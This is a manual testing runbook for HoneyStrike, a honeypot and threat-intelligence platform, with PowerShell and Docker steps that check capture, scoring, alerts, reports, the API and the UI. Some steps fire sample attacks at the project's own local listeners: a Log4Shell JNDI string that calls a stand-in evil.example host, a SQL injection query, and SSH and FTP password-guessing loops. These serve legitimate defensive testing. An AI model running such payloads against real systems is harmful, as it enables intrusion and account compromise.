# HoneyStrike — manual testing runbook

A step-by-step walkthrough for verifying every feature works end-to-end. Run in order for a full acceptance test, or jump to a specific section. All commands assume **Windows PowerShell** in the project root, using the dev compose stack.

> **Symbol legend** — ✅ expected on success · ⚠ tolerated edge case · ❌ should not happen.

---

## 0. Pre-flight

### 0.1 Bring the stack up

```powershell
docker compose -f docker-compose.dev.yml up -d postgres redis
docker compose -f docker-compose.dev.yml run --rm app alembic upgrade head
docker compose -f docker-compose.dev.yml up -d `
  ssh-honeypot http-honeypot ftp-honeypot rdp-honeypot tls-honeypot `
  fingerprint-worker alerting-worker report-worker dashboard-api
```

✅ Last command lists `Started` next to each `honeystrike-*` container.

### 0.2 Bootstrap the admin user

```powershell
docker compose -f docker-compose.dev.yml run --rm app python -m honeystrike.api.bootstrap
```

✅ Output ends with `bootstrap.admin_created username=admin` (or `admin_rotated` on a re-run).

### 0.3 Confirm everything is up

```powershell
docker compose -f docker-compose.dev.yml ps --format "table {{.Name}}`t{{.Status}}"
```

✅ Every `honeystrike-*` container reports `Up` (healthy / running).

```powershell
$ports = @{
  "SSH"=2222; "HTTP"=18080; "FTP"=2221; "RDP"=33389; "TLS"=8443; "API"=8001;
  "Postgres"=5432; "Redis"=6379
}
foreach ($k in $ports.Keys) {
  $r = Test-NetConnection -ComputerName 127.0.0.1 -Port $ports[$k] `
       -WarningAction SilentlyContinue
  "$k`tport=$($ports[$k])`treachable=$($r.TcpTestSucceeded)"
}
```

✅ Eight lines, all `reachable=True`.

### 0.4 Capture a Bearer token (used by every API test below)

```powershell
$body = '{"username":"admin","password":"change-me-strong-password"}'
$res = Invoke-RestMethod -Method Post -Uri http://localhost:8001/api/auth/login `
       -ContentType 'application/json' -Body $body
$TOKEN = $res.access_token
"Token first 32 chars: $($TOKEN.Substring(0,32))…"
$HDR = @{ Authorization = "Bearer $TOKEN" }
```

✅ Prints a 32-char prefix; ❌ blank means login failed.

### 0.5 Reset shared state between runs

```powershell
docker exec honeystrike-cache redis-cli FLUSHDB | Out-Null
"OK Redis flushed"
```

This wipes Redis (stream cursors, dedup keys, attempt counters). The Postgres data stays — every test below appends new rows you can spot by timestamp.

---

## 1. Sanity — DB schema is migrated

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c "\dt"
```

✅ 10 tables: `alembic_version`, `alerts`, `events`, `fingerprints`, `geo_cache`, `ml_anomaly_scores`, `reports`, `sessions`, `ttp_matches`, `users`. (The events-partitioning migration in `infra/migrations/003_events_partitioning.sql` is operator-triggered — until you run it, `events` is a normal table.)

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT version_num FROM alembic_version"
```

✅ `003`.

---

## 2. Honeypot listeners — capture a session per service

Each block fires one realistic attack at one listener and verifies a session + events land in Postgres within 2 s.

### 2.1 SSH (Paramiko brute force)

```powershell
$before = Get-Date
docker run --rm --network honey_strike_v1_honeypot-net honeystrike-dev:latest `
  python -c @"
import paramiko, socket
s = socket.create_connection(('ssh-honeypot', 22), 10)
t = paramiko.Transport(s); t.start_client(timeout=10)
for pw in ['root','toor','123456','password','letmein','admin']:
    try: t.auth_password('root', pw); break
    except paramiko.AuthenticationException: pass
    except paramiko.SSHException: break
t.close()
print('done')
"@

Start-Sleep -Seconds 2
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT id, src_ip, state, event_count FROM sessions WHERE service='ssh' AND started_at >= '$($before.ToUniversalTime().ToString('o'))' ORDER BY started_at DESC LIMIT 1"
```

✅ One row with `state='CLOSED'` and `event_count >= 3` (auth attempts captured).

### 2.2 HTTP (sqlmap UA + Log4Shell + SQLi)

```powershell
$before = Get-Date
$body = '${jndi:ldap://evil.example/a}'
Invoke-WebRequest -Method Post `
  -Uri "http://localhost:18080/.env?id=1+UNION+SELECT+password+FROM+users" `
  -Headers @{ "User-Agent" = "sqlmap/1.7.8#stable"; "Content-Type" = "text/plain" } `
  -Body $body -SkipHttpErrorCheck | Out-Null

Start-Sleep -Seconds 2
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT s.id, s.src_ip, e.payload->>'scanner_detected' AS scanner, e.payload->>'cve_signature' AS cve, e.payload->>'sqli_pattern' AS sqli FROM sessions s JOIN events e ON e.session_id=s.id WHERE s.service='http' AND s.started_at >= '$($before.ToUniversalTime().ToString('o'))' ORDER BY s.started_at DESC LIMIT 1"
```

✅ One row: `scanner=sqlmap`, `cve=CVE-2021-44228`, `sqli=true`.

### 2.3 FTP (Hydra-style login)

```powershell
$before = Get-Date
docker run --rm --network honey_strike_v1_honeypot-net python:3-slim `
  python -c "import ftplib,contextlib;f=ftplib.FTP();f.connect('ftp-honeypot',21,10);[f.login(u,p) for u,p in [('root','toor'),('admin','admin'),('root','root')] if (lambda: True)()]" 2>$null
Start-Sleep -Seconds 2
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT id, src_ip, event_count FROM sessions WHERE service='ftp' AND started_at >= '$($before.ToUniversalTime().ToString('o'))' ORDER BY started_at DESC LIMIT 1"
```

✅ One row with `event_count >= 2`.

### 2.4 RDP (TPKT + X.224 connection request with mstshash cookie)

```powershell
$before = Get-Date
docker run --rm --network honey_strike_v1_honeypot-net python:3-slim `
  python -c @"
import socket, struct, contextlib
s = socket.create_connection(('rdp-honeypot', 3389), 5)
cookie = b'Cookie: mstshash=ManualTest\r\n'
neg = struct.pack('<BBHI', 0x01, 0x00, 8, 0x01)
payload = cookie + neg
x224 = bytes([6+len(payload), 0xE0, 0, 0, 0, 0, 0]) + payload
s.sendall(bytes([0x03, 0x00]) + struct.pack('>H', 4+len(x224)) + x224)
with contextlib.suppress(socket.timeout): s.recv(4096)
s.close()
"@

Start-Sleep -Seconds 2
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT s.id, e.payload->>'mstshash' AS cookie FROM sessions s JOIN events e ON e.session_id=s.id WHERE s.service='rdp' AND e.event_type='RDP_CONNECT' AND s.started_at >= '$($before.ToUniversalTime().ToString('o'))' ORDER BY s.started_at DESC LIMIT 1"
```

✅ One row with `cookie=ManualTest`.

### 2.5 TLS (JA3 ClientHello fingerprint)

```powershell
$before = Get-Date
try { Invoke-WebRequest -Uri "https://localhost:8443/" -SkipCertificateCheck `
      -TimeoutSec 5 -SkipHttpErrorCheck | Out-Null } catch {}

Start-Sleep -Seconds 2
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT s.id, e.payload->>'ja3_hash' AS ja3, e.payload->>'sni' AS sni FROM sessions s JOIN events e ON e.session_id=s.id WHERE s.service='tls' AND s.started_at >= '$($before.ToUniversalTime().ToString('o'))' ORDER BY s.started_at DESC LIMIT 1"
```

✅ `ja3` is a 32-char hex string, `sni=localhost`.

---

## 3. Intel pipeline — enrichment + TTPs + threat score

After step 2, the FingerprintWorker has had ~2 s to enrich. Check what landed:

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT service, count(*) AS sessions, max(severity) AS sev, max(threat_score) AS score FROM sessions WHERE started_at > NOW() - INTERVAL '5 minutes' AND state='CLOSED' GROUP BY service ORDER BY service"
```

✅ One row per service hit. Scores depend heavily on whether multiple services from the same IP fired (sibling-session detection pushes scores up):

| Service | Standalone | Same IP also hit ≥ 1 other service |
|---|---|---|
| SSH (Hydra-style) | 75–82 | 78–95 |
| HTTP (sqlmap + sqli + CVE → T1190 + T1592) | 60–75 | 70–95 |
| FTP (single login) | 0–30 (`low`) | 40–63 |
| RDP (mstshash cookie) | 0–30 (`low`) | 40–63 |
| TLS (JA3 capture, no other signal) | 0 (`low`) | 30–63 |

In isolation FTP / RDP / TLS look benign; the platform's job is to recognise them as malicious *in aggregate* — multi-service-scan triggers `T1595.001` (0.95 confidence) on every session from the same IP within 60 s, lifting their scores.

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT s.service, t.technique_id, t.technique_name, t.confidence FROM ttp_matches t JOIN sessions s ON s.id=t.session_id WHERE s.started_at > NOW() - INTERVAL '5 minutes' ORDER BY t.confidence DESC LIMIT 15"
```

✅ See a mix of:
- `T1110.001` (password guessing) on SSH/FTP
- `T1110.004` (cred-stuffing) if multi-username
- `T1190` (exploit public app) on HTTP with cve_signature/sqli_pattern
- `T1078` (valid accounts) on SSH if shell granted
- `T1592` (victim host info) on /.env-style URIs
- `T1595.001` (scanning IP blocks) on multi-service same IP

### 3.1 Sibling-session detection

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT f.session_id, jsonb_array_length(f.tool_signatures) AS tools, f.tool_signatures FROM fingerprints f JOIN sessions s ON s.id=f.session_id WHERE s.started_at > NOW() - INTERVAL '5 minutes' AND jsonb_array_length(f.tool_signatures) >= 2 LIMIT 3"
```

✅ Sessions where multiple services were hit from one IP show `Multi-service scanner` or `Masscan / port-scan` in `tool_signatures`.

---

## 4. Alerts dispatched

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT channel, severity, threat_score, payload->>'subject' AS subject FROM alerts WHERE dispatched_at > NOW() - INTERVAL '5 minutes' ORDER BY dispatched_at DESC LIMIT 10"
```

✅ At least one `channel=log` row per unique `(src_ip, severity)` combo within the 30-min cooldown.

```powershell
docker logs --since 10m honeystrike-alerting | Select-String "alert\."
```

✅ See `alert.dispatched` and `alerting.deduped` lines (rest deduped is normal — same IP / severity within cooldown).

⚠ If you set `TELEGRAM_TOKEN` / `SLACK_WEBHOOK_URL` / SMTP in `.env`, you'll see those channels in the rows too. Without them only `log` fires — fail-open works.

---

## 5. Reports auto-generated

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT session_id, format, file_size_bytes, threat_score_snapshot FROM reports WHERE generated_at > NOW() - INTERVAL '5 minutes' ORDER BY generated_at DESC LIMIT 5"
```

✅ One PDF per session that scored ≥ `REPORT_AUTO_TRIGGER_SCORE` (default 60). `file_size_bytes >= 15000`.

```powershell
docker logs --since 5m honeystrike-reports | Select-String "report\.generated"
```

✅ Matching `report.generated file=/reports/session-…pdf size_bytes=…` lines.

### 5.1 Download a report through the API

```powershell
$sid = docker exec honeystrike-db psql -U honeystrike -d honeystrike -tAc `
  "SELECT session_id FROM reports WHERE format='pdf' ORDER BY generated_at DESC LIMIT 1"
$sid = $sid.Trim()
Invoke-WebRequest -Headers $HDR -Uri "http://localhost:8001/api/sessions/$sid/report?format=pdf" `
  -OutFile "manual-test-report.pdf"
Get-Item manual-test-report.pdf | Format-Table Name, Length
```

✅ `manual-test-report.pdf` ~20 KB. Open it — should show source/session/tool/TTP/event-preview/alerts panels with a coloured severity pill.

### 5.2 Trigger a report manually

```powershell
$sid = docker exec honeystrike-db psql -U honeystrike -d honeystrike -tAc `
  "SELECT id FROM sessions WHERE service='ssh' ORDER BY started_at DESC LIMIT 1"
$sid = $sid.Trim()

Invoke-RestMethod -Method Post -Headers $HDR `
  -Uri "http://localhost:8001/api/sessions/$sid/report?format=html"
```

✅ Returns `report_id=…`, `status=queued`, `estimated_seconds=5`. Wait ~3 s, then:

```powershell
Invoke-WebRequest -Headers $HDR `
  -Uri "http://localhost:8001/api/sessions/$sid/report?format=html" `
  -OutFile "manual-test-report.html"
Start-Process manual-test-report.html
```

✅ Browser opens the dark-themed HTML report with collapsible sections.

---

## 6. JSON API

### 6.1 Sessions list with filters

```powershell
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/sessions?limit=5&min_score=50" `
  | ConvertTo-Json -Depth 6
```

✅ `total >= 5`, `items` contains scored sessions with `country_iso`, `severity`, `ttp_count`.

### 6.2 Session detail

```powershell
$sid = (Invoke-RestMethod -Headers $HDR "http://localhost:8001/api/sessions?limit=1").items[0].id
Invoke-RestMethod -Headers $HDR -Uri "http://localhost:8001/api/sessions/$sid" `
  | ConvertTo-Json -Depth 8 | Out-String | Select-Object -First 60
```

✅ Returns the full detail payload — fingerprint, TTPs, events preview, alerts.

### 6.3 Analytics

```powershell
"--- overview ---"
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stats/overview?days=1" | ConvertTo-Json -Depth 5
"--- top TTPs ---"
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stats/ttps?days=7&limit=5" | ConvertTo-Json
"--- top countries ---"
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stats/geo?days=7&limit=5" | ConvertTo-Json
"--- timeline (hour) ---"
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stats/timeline?days=1&bucket=hour" `
  | Select-Object -First 5 | ConvertTo-Json
```

✅ All four endpoints return non-empty JSON that matches the shape in `docs/02_API_Contracts.md`.

### 6.4 Health (public, no auth)

```powershell
Invoke-RestMethod -Uri "http://localhost:8001/api/health"
```

✅ `{ status: ok, version: 0.1.0, db: ok, redis: ok }`.

### 6.5 Auth negative cases

```powershell
"--- 401 without token ---"
try { Invoke-RestMethod -Uri "http://localhost:8001/api/sessions" } `
  catch { $_.Exception.Response.StatusCode.value__ }

"--- 401 with wrong password ---"
try {
  Invoke-RestMethod -Method Post -ContentType 'application/json' `
    -Body '{"username":"admin","password":"wrong"}' `
    -Uri "http://localhost:8001/api/auth/login"
} catch { $_.Exception.Response.StatusCode.value__ }

"--- 401 with tampered token ---"
$bad = $TOKEN.Substring(0, $TOKEN.Length-5) + "AAAAA"
try { Invoke-RestMethod -Headers @{Authorization="Bearer $bad"} `
       -Uri "http://localhost:8001/api/sessions" } `
  catch { $_.Exception.Response.StatusCode.value__ }
```

✅ All three print `401`.

---

## 7. WebSocket live feed

PowerShell doesn't have a built-in WS client. Easiest test: open the UI in a browser (section 9) and watch the map populate as you re-run section 2 probes — markers appear within 2 s.

Programmatic alternative (Python):

```powershell
docker compose -f docker-compose.dev.yml run --rm `
  -e TOKEN=$TOKEN app python -c @"
import asyncio, json, os, websockets
async def main():
    url = f'ws://dashboard-api:8000/api/ws/live?token={os.environ[\"TOKEN\"]}&poll=1'
    async with websockets.connect(url) as ws:
        for _ in range(5):
            print(json.loads(await asyncio.wait_for(ws.recv(), 10)))
asyncio.run(main())
"@
```

✅ Prints 5 messages. First N are `{type: "session", …}` (seed); then `{type: "seed_complete", count: …}`.

---

## 8. STIX 2.1 + TAXII 2.1 export

### 8.1 STIX bundle

```powershell
"--- bundle stats ---"
Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stix/stats?days=7&min_score=50"

"--- pull bundle ---"
$bundle = Invoke-RestMethod -Headers $HDR `
  -Uri "http://localhost:8001/api/stix/bundle?days=7&min_score=50&limit=25"
"type: $($bundle.type)  id: $($bundle.id)  objects: $($bundle.objects.Length)"
$bundle.objects | Group-Object type | Format-Table Count, Name
```

✅ `type=bundle`, `id=bundle--…`, `objects.Length >= 1`. Group table shows `identity` (1), then `indicator` / `ipv4-addr` / `network-traffic` / `observed-data` / `sighting` (1 each per session up to the limit).

### 8.2 TAXII discovery + collection

```powershell
"--- TAXII discovery ---"
Invoke-RestMethod -Headers $HDR -Uri "http://localhost:8001/taxii2/"

"--- collections ---"
Invoke-RestMethod -Headers $HDR -Uri "http://localhost:8001/taxii2/v1/collections/"

"--- pull objects through TAXII ---"
$res = Invoke-WebRequest -Headers $HDR `
  -Uri "http://localhost:8001/taxii2/v1/collections/honeystrike-high-severity/objects/?days=7&min_score=50&limit=10"
"Content-Type: $($res.Headers['Content-Type'])"
$bundle = $res.Content | ConvertFrom-Json
"Bundle has $($bundle.objects.Length) objects"
```

✅ `Content-Type` starts with `application/stix+json;version=2.1`; bundle objects > 0.

---

## 9. UI walkthrough (browser)

Open **<http://localhost:8001/login>** in a browser.

| Step | What to do | Expected |
|---|---|---|
| 9.1 | Sign in: `admin` / `change-me-strong-password` | Lands on `/` — Leaflet world map appears |
| 9.2 | Wait or re-run any probe from section 2 | A coloured marker pulses on the map; the sidebar's "Recent sessions" gains a row at the top |
| 9.3 | Click a marker → popup → "Open detail →" | Navigates to `/sessions/{id}` with all panels populated |
| 9.4 | Top nav → **Sessions** | Paginated table loads; default 50/page |
| 9.5 | In the filters row: set `Service = ssh`, `Min score = 50`, click Apply | Table refreshes; URL hash updates with the filter state |
| 9.6 | Refresh the page | Filters + page survive (state restored from URL hash) |
| 9.7 | Click any row | Navigates to that session's detail page |
| 9.8 | Top nav → **Analytics** | Five Chart.js panels render: timeline, severity doughnut, services bar, TTP horizontal bar, geo bar |
| 9.9 | Change `Window = Last 30 days` → click Refresh | All five charts re-render with the new window |
| 9.10 | Top nav → **Logout** | Returns to `/login`; token cleared from sessionStorage |
| 9.11 | Open any UI URL directly without logging in | Auto-redirects to `/login` |

---

## 10. ML anomaly detector

```powershell
docker compose -f docker-compose.dev.yml run --rm app `
  python -m honeystrike.workers.intel.ml_anomaly
```

✅ Logs: `ml_anomaly.collected count=N`, `ml_anomaly.persisted count=N`, `model_version=if-…-0.05`. (If fewer than 30 scored sessions exist, the run skips with `ml_anomaly.skip_insufficient_samples` — that's expected on a fresh DB.)

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT s.service, s.threat_score, m.anomaly_score, m.is_anomaly FROM ml_anomaly_scores m JOIN sessions s ON s.id=m.session_id ORDER BY m.anomaly_score DESC LIMIT 10"
```

✅ Top rows have `anomaly_score > 0.5` and many `is_anomaly = t`. The most-outlier sessions surface first.

---

## 11. Automated test suites

```powershell
"--- unit (gated coverage ≥ 80%) ---"
docker compose -f docker-compose.dev.yml run --rm app `
  pytest tests/unit -q --cov=honeystrike --cov-fail-under=80

"--- integration (live stack) ---"
docker exec honeystrike-cache redis-cli FLUSHDB | Out-Null
docker compose -f docker-compose.dev.yml run --rm `
  -e HONEYPOT_SSH_HOST=ssh-honeypot -e HONEYPOT_HTTP_HOST=http-honeypot `
  -e HONEYPOT_FTP_HOST=ftp-honeypot -e HONEYPOT_RDP_HOST=rdp-honeypot `
  -e HONEYPOT_TLS_HOST=tls-honeypot `
  -e HONEYPOT_SSH_PORT=22 -e HONEYPOT_HTTP_PORT=80 -e HONEYPOT_FTP_PORT=21 `
  -e HONEYPOT_RDP_PORT=3389 -e HONEYPOT_TLS_PORT=443 `
  -e DASHBOARD_API_HOST=dashboard-api -e DASHBOARD_API_PORT=8000 `
  app pytest tests/integration -q
```

✅ Last lines: `166 passed`, `Required test coverage of 80% reached. Total coverage: 8X%`, then `34 passed`.

---

## 12. Lint / type / security gates

```powershell
"--- ruff ---"
docker compose -f docker-compose.dev.yml run --rm app ruff check src/honeystrike

"--- mypy --strict ---"
docker compose -f docker-compose.dev.yml run --rm app `
  mypy --strict src/honeystrike

"--- bandit -lll (HIGH only) ---"
docker compose -f docker-compose.dev.yml run --rm app `
  bandit -r src/honeystrike -lll
```

| Tool | Pass criterion |
|---|---|
| `ruff` | Cosmetic findings tolerated (line length, import order). ❌ if any `F`/`B`/`SIM`/`S` findings labelled `error`. |
| `mypy --strict` | ✅ `Success: no issues found in 61 source files`. |
| `bandit -lll` | ✅ `High: 0`. Medium/Low listings tolerated (honeypot binds to all interfaces, etc.). |

---

## 13. Failure-mode checks

### 13.1 Worker restarts cleanly

```powershell
docker compose -f docker-compose.dev.yml restart fingerprint-worker
Start-Sleep -Seconds 3
docker logs --tail 5 honeystrike-fingerprint
```

✅ See `fingerprint.consumer_group_created` (only if BUSYGROUP wasn't there) then `fingerprint.worker_started`. No traceback.

### 13.2 Re-delivery doesn't duplicate rows

After restarting the fingerprint worker (13.1), the pending list may contain unacked entries. They get re-processed but the upsert ensures no duplicates:

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike -c `
  "SELECT session_id, count(*) FROM fingerprints GROUP BY session_id HAVING count(*) > 1"
```

✅ 0 rows.

### 13.3 Bad alert envelope is acked + dropped

```powershell
docker exec honeystrike-cache redis-cli XADD honeystrike:alerts '*' bogus 1 | Out-Null
Start-Sleep -Seconds 3
docker logs --since 30s honeystrike-alerting | Select-String "alerting"
```

✅ Logs include `alerting.bad_envelope` followed by the consumer reading the next entry. No worker crash.

### 13.4 Container health probe

```powershell
docker inspect --format '{{.State.Health.Status}}' honeystrike-db honeystrike-cache
```

✅ Both print `healthy`.

---

## 14. Operational checks

### 14.1 Backups (prod compose's responsibility, but the script works in dev too)

```powershell
docker exec honeystrike-db pg_dump -U honeystrike -d honeystrike `
  -Fc -f /tmp/manual-backup.dump
docker exec honeystrike-db sh -c "ls -la /tmp/manual-backup.dump"
```

✅ A `.dump` file > 100 KB after even a brief test run.

### 14.2 Migration round-trip (the CI gate locally)

```powershell
docker exec honeystrike-db psql -U honeystrike -d honeystrike `
  -c "CREATE DATABASE migration_test"

docker compose -f docker-compose.dev.yml run --rm `
  -e DATABASE_URL=postgresql+asyncpg://honeystrike:change-me-honeystrike@postgres:5432/migration_test `
  app sh -c "alembic upgrade head && alembic downgrade base && alembic upgrade head"

docker exec honeystrike-db psql -U honeystrike -d honeystrike `
  -c "DROP DATABASE migration_test"
```

✅ Three `Running upgrade` / `Running downgrade` lines, no errors. Clean DB drop.

### 14.3 Spot-check the OpenAPI schema

```powershell
Invoke-WebRequest -Uri "http://localhost:8001/api/openapi.json" -OutFile fresh-openapi.json
$ours = Get-Content openapi.json -Raw
$live = Get-Content fresh-openapi.json -Raw
if ($ours -eq $live) { "OK: schemas match" } else { "DIFFER (regenerate openapi.json)" }
```

✅ `OK: schemas match` after a fresh build; if you've added endpoints, `DIFFER` is correct and means `openapi.json` should be regenerated.

---

## 14a. Phase 6 — `honeystrike` CLI + multiplayer game

The Phase 6 surfaces all run against the existing dev stack (lobby on port 8002 added automatically by `docker compose -f docker-compose.dev.yml up -d`).

### 14a.1 CLI scaffold smoke

```powershell
docker compose -f docker-compose.dev.yml run --rm app python -m honeystrike.cli --help
```

✅ Shows top-level commands: `login`, `register`, `players`, `challenge`, `attack`, `defend`.

### 14a.2 Fire a scenario through the CLI

```powershell
docker exec honeystrike-cache redis-cli --scan --pattern 'ssh:attempts:*' `
  | ForEach-Object { docker exec honeystrike-cache redis-cli DEL $_ } | Out-Null

docker compose -f docker-compose.dev.yml run --rm app `
  python -m honeystrike.cli attack ssh-hydra `
    --target ssh-honeypot:22 --intensity burst
```

✅ Output ends `✓ done — N attempts, granted=…`. New session lands in `sessions` table.

### 14a.3 Defender investigation

```powershell
$body = '{"username":"admin","password":"change-me-strong-password"}'
$tok = (Invoke-RestMethod -Method Post -Uri http://localhost:8001/api/auth/login `
       -ContentType 'application/json' -Body $body).access_token

$env:HONEYSTRIKE_TOKEN = $tok
$env:HONEYSTRIKE_API_BASE = "http://dashboard-api:8000"
docker compose -f docker-compose.dev.yml run --rm `
  -e HONEYSTRIKE_TOKEN=$tok -e HONEYSTRIKE_API_BASE=http://dashboard-api:8000 `
  app python -m honeystrike.cli defend recent --service ssh --limit 5
```

✅ Rich-formatted table of recent SSH sessions.

### 14a.4 Lobby — register + invite + accept

```powershell
$lobby = "http://localhost:8002"
Invoke-RestMethod -Method Post -Uri "$lobby/lobby/register" -ContentType 'application/json' `
  -Body '{"handle":"alice","public_endpoints":{"ssh":"alice.example:2222"}}'
Invoke-RestMethod -Method Post -Uri "$lobby/lobby/register" -ContentType 'application/json' `
  -Body '{"handle":"bob","public_endpoints":{"http":"bob.example:18080"}}'

Invoke-RestMethod -Method Get -Uri "$lobby/lobby/players"
```

✅ Both `alice` and `bob` appear with their endpoints.

### 14a.5 Blocking — block an attacker IP and confirm refusal

```powershell
$tok = (Invoke-RestMethod -Method Post -Uri http://localhost:8001/api/auth/login `
        -ContentType 'application/json' `
        -Body '{"username":"admin","password":"change-me-strong-password"}').access_token
$hdr = @{ Authorization = "Bearer $tok" }

# Hit /wp-login.php once to make the listener see your bridge IP.
Invoke-WebRequest -Uri http://localhost:18080/wp-login.php -SkipHttpErrorCheck | Out-Null

# Find the src_ip the listener captured.
$sid = (Invoke-RestMethod -Headers $hdr `
        -Uri "http://localhost:8001/api/sessions?limit=1&service=http").items[0].id
$src = (Invoke-RestMethod -Headers $hdr `
        -Uri "http://localhost:8001/api/sessions/$sid").src_ip

# Block it.
Invoke-RestMethod -Method Post -Headers $hdr `
  -Uri http://localhost:8001/api/defender/block `
  -ContentType 'application/json' `
  -Body "{`"ip`":`"$src`",`"ttl_seconds`":30}"

# Next request must be 403.
(Invoke-WebRequest -Uri http://localhost:18080/wp-login.php -SkipHttpErrorCheck).StatusCode
```

✅ Last line prints `403`. (After 30 s the block expires; subsequent requests return 200 again.)

### 14a.6 CTF canaries

```powershell
(Invoke-WebRequest -Uri http://localhost:18080/.env).Content -match 'AKIA0HONEYSTRIKECANARY'
(Invoke-WebRequest -Uri http://localhost:18080/admin).Content -match 'hs-canary-token'
```

✅ Both `True`.

### 14a.7 `defend flags-found`

After running probes against `/.env`, `/admin`, `/.git/HEAD`:

```powershell
$tok = (Invoke-RestMethod -Method Post -Uri http://localhost:8001/api/auth/login `
        -ContentType 'application/json' `
        -Body '{"username":"admin","password":"change-me-strong-password"}').access_token
docker compose -f docker-compose.dev.yml run --rm `
  -e HONEYSTRIKE_TOKEN=$tok -e HONEYSTRIKE_API_BASE=http://dashboard-api:8000 `
  app python -m honeystrike.cli defend flags-found --days 1
```

✅ Rich table listing each captured canary (`aws-key`, `admin-token`, etc.) with time + src_ip.

---

## 15. Tear down

```powershell
docker compose -f docker-compose.dev.yml down
# Or, to also wipe the DB + Redis volumes:
docker compose -f docker-compose.dev.yml down -v
```

---

## Cheat-sheet — quickly diagnose "X doesn't seem to work"

| Symptom | First place to look |
|---|---|
| Probe finished but no session row | `docker logs honeystrike-<service>` — banner errors / handshake failures |
| Session row exists but no fingerprint | `docker logs honeystrike-fingerprint` + `XPENDING honeystrike:events intel` |
| Fingerprint exists but no TTPs | Threshold tuning — TTP rules require ≥3 attempts / specific payload markers. Check `events.payload`. |
| No alert dispatched | `docker logs honeystrike-alerting` — `alerting.deduped` means another alert for same `(ip, severity)` won within `ALERT_COOLDOWN_SECONDS`. Flush Redis (`0.5`) to reset. |
| Report stuck on "queued" | `XPENDING honeystrike:report_jobs reports` — if non-zero pending, the worker is busy. `docker logs honeystrike-reports` shows WeasyPrint chatter; expect 1–3 s per PDF. |
| `/api/ws/live` immediately closes | Check the access token — query param `?token=…` must be a current, non-expired access token (refresh tokens are rejected on purpose). |
| UI says "Failed to load: 401" | Token expired (default TTL `JWT_ACCESS_TTL_SECONDS=3600`). Sign out and back in. |
| Charts render blank | Open browser devtools → Network → confirm `/api/stats/overview` etc return 200. Chart.js fetches from CDN — confirm `cdn.jsdelivr.net` is reachable. |

---

If anything in here doesn't produce the expected output, copy the failing block + the relevant container log lines and we'll dig in.
